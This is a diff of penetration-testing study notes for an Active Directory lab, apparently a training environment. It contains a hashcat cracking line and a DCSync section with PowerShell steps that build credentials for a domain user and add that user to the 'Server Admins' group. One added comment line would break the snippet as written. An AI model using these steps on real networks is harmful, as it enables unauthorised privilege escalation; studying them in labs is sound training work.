@@ -20,16 +20,21 @@ hashcat hash  /usr/share/wordlists/rockyou.txt
 ### DCSync Attack 
 Part 1 
 ```
-$timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force
+$timpass = ConvertTo-SecureString '<PASSWORD REDACTED>' -AsPlainText -Force #Purpose: Converts a plain-text string password into a SecureString object. 
+Context: The -Force flag suppresses confirmation warnings about creating a secure string from plain text.
 ```
 Part 2 
 ```
-$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)
+$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass) #Combines the username INLANEFREIGHT\timmons # Purpose: Combines the username (INLANEFREIGHT\timmons) and the secure password ($timpass) into a single PSCredential object.
+
 
 ```
 Part 3
 ```
 $group = Convert-NameToSid "Server Admins"
 ```
+Part 4
 
+```
 Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
+```
